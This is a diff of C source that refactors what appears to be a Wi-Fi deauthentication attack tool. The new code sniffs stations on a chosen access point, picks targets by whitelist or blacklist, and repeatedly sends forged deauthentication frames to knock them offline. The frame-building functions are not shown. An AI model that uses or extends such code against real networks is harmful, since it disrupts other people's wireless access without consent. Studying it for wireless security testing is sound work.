@@ -395,9 +395,9 @@ int is_target_mac(uchar *mac)
 /* Sniffing Functions */
 uchar *get_target(uchar *bssid)
 {
-    uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
+    uchar *sniffed_packet_data = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
     uchar *fetched_bssid = NULL;
-    uchar *station_mac = NULL;
+    uchar *source = NULL;
 
     // Sniffing for data frames to find targets
     int packet_length = 0;
@@ -406,55 +406,27 @@ uchar *get_target(uchar *bssid)
         packet_length = 0;
 
         do {
-            packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
+            packet_length = read_packet(sniffed_packet_data, MAX_PACKET_LENGTH);
 
             if (packet_length >= 22) {
-                fetched_bssid = get_mac_from_packet(BSSID, sniffed_packet);
-                station_mac = get_mac_from_packet(SOURCE, sniffed_packet);
+                fetched_bssid = get_mac_from_packet(BSSID, sniffed_packet_data);
+                source = get_mac_from_packet(SOURCE, sniffed_packet_data);
             }
         } while(
             packet_length < 22 ||
             memcmp(bssid, fetched_bssid, MAC_LENGTH) ||
-            !memcmp(station_mac, fetched_bssid, MAC_LENGTH) ||
-            !is_target_mac(station_mac)
+            !memcmp(source, fetched_bssid, MAC_LENGTH) ||
+            !is_target_mac(source)
         );
 
-        return sniffed_packet;
+        return sniffed_packet_data;
     }
 }
 
-void run_deauth(uchar *bssid, int how_many)
+void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
 {
-    uchar *sniffed_packet_data = NULL;
-    uchar *mac_station = NULL;
-    struct packet result_packet;
     int counter = 0;
-
-    sniffed_packet_data = get_target(bssid);
-    mac_station = get_mac_from_packet(SOURCE, sniffed_packet_data);
-
-    if (verbose) {
-        printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
-        printf("Expected BSSID: ");
-        print_mac(bssid);
-        printf("\n---- Frame ----\n");
-        printf("Station: ");
-        print_mac(mac_station);
-
-        if  (with_whitelist)
-        {
-            printf("The station mac is not in the whitelist.\n");
-        }
-        else
-        {
-            printf("The station mac is in the blacklist.\n");
-        }
-
-        printf("The captured packet itself: \n");
-        print_packet(sniffed_packet_data, MAX_PACKET_LENGTH);
-    }
-
-    result_packet = create_deauth_frame(mac_station, bssid, bssid, 1);
+    struct packet result_packet = create_deauth_frame(station, bssid, bssid, 1);
 
     if (verbose)
     {
@@ -467,7 +439,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(mac_station, bssid, bssid, 0);
+    result_packet = create_deauth_frame(station, bssid, bssid, 0);
 
     if (verbose)
     {
@@ -480,7 +452,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(bssid, mac_station, bssid, 1);
+    result_packet = create_deauth_frame(bssid, station, bssid, 1);
 
     if (verbose)
     {
@@ -493,7 +465,7 @@ void run_deauth(uchar *bssid, int how_many)
 
     if (verbose) printf("%d packets send\n\n", how_many);
 
-    result_packet = create_deauth_frame(bssid, mac_station, bssid, 0);
+    result_packet = create_deauth_frame(bssid, station, bssid, 0);
 
     if (verbose)
     {
@@ -505,8 +477,6 @@ void run_deauth(uchar *bssid, int how_many)
         send_packet(result_packet.data, result_packet.length);
 
     if (verbose) printf("%d packets send\n\n    ", how_many);
-
-    free(sniffed_packet_data);
 }
 
 void print_help()
@@ -665,7 +635,33 @@ int main(int argc, const char *argv[])
 
     while (1)
     {
-        run_deauth(bssid, how_many);
+        uchar *target_packet = get_target(bssid);
+        uchar *station = get_mac_from_packet(SOURCE, target_packet);
+
+        if (verbose) {
+            printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
+            printf("Expected BSSID: ");
+            print_mac(bssid);
+            printf("\n---- Frame ----\n");
+            printf("Station: ");
+            print_mac(station);
+
+            if  (with_whitelist)
+            {
+                printf("The station mac is not in the whitelist.\n");
+            }
+            else
+            {
+                printf("The station mac is in the blacklist.\n");
+            }
+
+            printf("The captured packet itself: \n");
+            print_packet(target_packet, MAX_PACKET_LENGTH);
+        }
+
+        deauthenticate_station(bssid, station, how_many);
+
+        free(target_packet);
     }
 
     free(bssid);
